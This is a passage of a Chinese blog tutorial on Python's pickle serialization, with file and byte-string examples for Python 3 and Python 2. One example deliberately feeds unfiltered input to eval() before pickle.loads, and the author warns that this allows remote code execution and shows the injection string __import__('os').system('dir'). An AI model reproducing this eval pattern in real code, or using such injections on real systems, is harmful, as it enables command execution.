{"title":"Python之pickle库学习","uid":"c480346b91894d7a42d60e2db7bccc10","slug":"Python之pickle库学习","date":"2021-02-03T01:23:23.000Z","updated":"2021-06-28T14:41:40.000Z","comments":true,"path":"api/articles/Python之pickle库学习.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200323233608.png","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>以下内容主要是基于Python3的，Python2环境下序列化的用法和以下类似，但是序列化生成的结果与Python3环境下是不同的。Python</p>\n<p>2的pickle内容从实例三开始。</p>\n<h2 id=\"什么是pickle库\"><a href=\"#什么是pickle库\" class=\"headerlink\" title=\"什么是pickle库\"></a>什么是pickle库</h2><ol>\n<li><p>Python标准库，只支持python的基本数据类型。</p>\n</li>\n<li><p>可以处理复杂的序列化语法，序列化时，只是序列化整个序列对象，而非内存地址。</p>\n</li>\n</ol>\n<p>pickle模块实现了基本的数据序列化和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。所以pickle库也有两类主要接口，一个是序列化接口，一个是反序列化接口。</p>\n<h2 id=\"如何使用pickle库\"><a href=\"#如何使用pickle库\" class=\"headerlink\" title=\"如何使用pickle库\"></a>如何使用pickle库</h2><p>要想调用pickle库，很简单。因为这是一个Python的内置库，不需要另行安装，可以直接引用。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>而pickle的常用函数有如下几个：</p>\n<h3 id=\"pickle-dump\"><a href=\"#pickle-dump\" class=\"headerlink\" title=\"pickle.dump()\"></a>pickle.dump()</h3><p><code>pickle.dump(object, file, protocol=None)</code></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>dump操作方法可以将序列以二进制的形式存放在文件中，以便下次使用。</p></blockquote>\n<ul>\n<li>必填参数 obj 表示将要封装的对象</li>\n<li>必填参数 file 表示 object 要写入的文件对象，file 必须以二进制模式打开，即 wb。file文件指的是<code>.pkl</code>后缀的pkl文件。</li>\n<li>可选参数 protocol 表示告知 pickle 使用的协议，支持的协议一共有5中不同的类型，即（0,1,2,3,4）。（0,1,2）对应的是python早期的版本，（3,4）则是在python3之后的版本。默认的协议是添加在 Python 3 中的协议 3。</li>\n</ul>\n<h3 id=\"pickle-load\"><a href=\"#pickle-load\" class=\"headerlink\" title=\"pickle.load()\"></a>pickle.load()</h3><p><code>pickle.load(file)</code></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>load()操作方法可以从字节对象中读取被封装的对象</p></blockquote>\n<p>file文件依旧是<code>.pkl</code>后缀的pkl文件，并且读取也应使用rb权限，因为是二进制文件。</p>\n<h3 id=\"pickle-dumps\"><a href=\"#pickle-dumps\" class=\"headerlink\" title=\"pickle.dumps()\"></a>pickle.dumps()</h3><p><code>pickle.dumps(object)</code></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>dumps()操作方法将object对象序列化并返回一个byte对象，而不是存入到文件中</p></blockquote>\n<h3 id=\"pickle-loads\"><a href=\"#pickle-loads\" class=\"headerlink\" title=\"pickle.loads()\"></a>pickle.loads()</h3><p><code>pickle.loads(bytes_object)</code></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>loads()操作方法从字节对象中读取被封装的对象</p></blockquote>\n<h2 id=\"实例一\"><a href=\"#实例一\" class=\"headerlink\" title=\"实例一\"></a>实例一</h2><h3 id=\"序列化到pkl文件\"><a href=\"#序列化到pkl文件\" class=\"headerlink\" title=\"序列化到pkl文件\"></a>序列化到pkl文件</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    ls <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'A1andNS'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Alan'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Alice'</span><span class=\"token punctuation\">]</span>\n    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test.pkl'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span>\n    pickle<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    serialize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行后在同目录下生成了一个test.pkl文件，这就是完成了一个序列化的操作。pkl文件中的二进制序列化对象，可读型是很差的。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203094913304.png\" alt=\"image-20210203094913304\"></p>\n<p>下面我们试着反序列化。</p>\n<h3 id=\"从pkl文件反序列化\"><a href=\"#从pkl文件反序列化\" class=\"headerlink\" title=\"从pkl文件反序列化\"></a>从pkl文件反序列化</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test.pkl'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span>\n    test <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    unserialize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203095509348.png\" alt=\"image-20210203095509348\"></p>\n<p>成功反序列化回原来的list类型数据。</p>\n<h2 id=\"实例二\"><a href=\"#实例二\" class=\"headerlink\" title=\"实例二\"></a>实例二</h2><h3 id=\"序列化到二进制字符\"><a href=\"#序列化到二进制字符\" class=\"headerlink\" title=\"序列化到二进制字符\"></a>序列化到二进制字符</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    ls <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'A1andNS'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Alan'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Alice'</span><span class=\"token punctuation\">]</span>\n    data <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    serialize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行结果，得到一个byte类型的数据。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203100045526.png\" alt=\"image-20210203100045526\"></p>\n<p>我们现在来尝试反序列化：</p>\n<h3 id=\"二进制字符反序列化\"><a href=\"#二进制字符反序列化\" class=\"headerlink\" title=\"二进制字符反序列化\"></a>二进制字符反序列化</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    data <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x80\\x04\\x95\\x1e\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(\\x8c\\x07A1andNS\\x94\\x8c\\x04Alan\\x94\\x8c\\x05Alice\\x94e.'</span>\n    ls <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    unserialize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203100910074.png\" alt=\"image-20210203100910074\"></p>\n<p>也可以成功的反序列化回到list类型，但是如果是从外部接收输入会怎么样呢？</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    data <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"please enter your data:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    ls <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    unserialize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里有一个问题是input接收的数据是str类型，所以使用eval()来进行自动类型转换，就可以实现数据变成bytes类型了。</p>\n<p>我们从键盘输入二进制数据：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">b&#39;\\x80\\x04\\x95\\x1e\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(\\x8c\\x07A1andNS\\x94\\x8c\\x04Alan\\x94\\x8c\\x05Alice\\x94e.&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203112031413.png\" alt=\"image-20210203112031413\"></p>\n<p>这样就成功实现了反序列化，但是这里的例子很简单，使用了eval()，而且没有对用户输入做任何过滤，如果这样编写这个程序，就可能会导致一个RCE问题，所以一般情况下input接收的数据是需要进行过滤的。</p>\n<p>例如使用这个语句调用os库的system函数执行系统命令<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code></p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203111108684.png\" alt=\"image-20210203111108684\"></p>\n<h2 id=\"实例三\"><a href=\"#实例三\" class=\"headerlink\" title=\"实例三\"></a>实例三</h2><p>下面来看看Python2环境下的pickle。首先的一个不同就是在py2中序列化后结果是str类型，而不是py3的bytes类型。</p>\n<h3 id=\"序列化到pkl文件-1\"><a href=\"#序列化到pkl文件-1\" class=\"headerlink\" title=\"序列化到pkl文件\"></a>序列化到pkl文件</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    ls <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'A1andNS'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Alan'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Alice'</span><span class=\"token punctuation\">]</span>\n    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test.pkl'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span>\n    pickle<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    serialize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里文件权限只要用w就好了，因为str类型的原因，它已经不是一个二进制文件了。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210204124416450.png\" alt=\"image-20210204124416450\"></p>\n<p>这样我们就生成了一个序列化文件test.pkl，下面我们来对这个pkl文件进行反序列化操作。</p>\n<h3 id=\"从pkl文件反序列化-1\"><a href=\"#从pkl文件反序列化-1\" class=\"headerlink\" title=\"从pkl文件反序列化\"></a>从pkl文件反序列化</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test.pkl'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span>\n    test <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    unserialize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>所以对应的读权限也只要使用r就可以了，也是可以成功进行的反序列化的。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210204124648035.png\" alt=\"image-20210204124648035\"></p>\n<h2 id=\"实例四\"><a href=\"#实例四\" class=\"headerlink\" title=\"实例四\"></a>实例四</h2><h3 id=\"序列化到字符串\"><a href=\"#序列化到字符串\" class=\"headerlink\" title=\"序列化到字符串\"></a>序列化到字符串</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> urllib\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    ls <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'A1andNS'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Alan'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Alice'</span><span class=\"token punctuation\">]</span>\n    data <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span> data\n    <span class=\"token keyword\">print</span> urllib<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    serialize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>所以我们可以得到序列化后的str类型数据：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">(lp0\nS&#39;A1andNS&#39;\np1\naS&#39;Alan&#39;\np2\naS&#39;Alice&#39;\np3\na.\n\n编码后：\n%28lp0%0AS%27A1andNS%27%0Ap1%0AaS%27Alan%27%0Ap2%0AaS%27Alice%27%0Ap3%0Aa.<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以明显发现python2的序列化结果和python3的序列化结果是不同的，为了方便使用，一般可以会对其进行编码，例如urllib.quote()等</p>\n<h3 id=\"从字符串反序列化\"><a href=\"#从字符串反序列化\" class=\"headerlink\" title=\"从字符串反序列化\"></a>从字符串反序列化</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> urllib\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    data <span class=\"token operator\">=</span> <span class=\"token string\">'%28lp0%0AS%27A1andNS%27%0Ap1%0AaS%27Alan%27%0Ap2%0AaS%27Alice%27%0Ap3%0Aa.'</span>\n    ls <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>urllib<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    unserialize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210204122607667.png\" alt=\"image-20210204122607667\"></p>\n<p>成功进行了反序列化操作，回到了原来的list类型。</p>\n<p>同样的那么如果是从键盘接收数据呢，这里在py2下方便了不少，因为input接收的是str类型，刚好pickle序列化后也是str类型，所以就避免了类型转换的问题了。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> urllib\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    data <span class=\"token operator\">=</span> <span class=\"token builtin\">raw_input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'please enter your data:'</span><span class=\"token 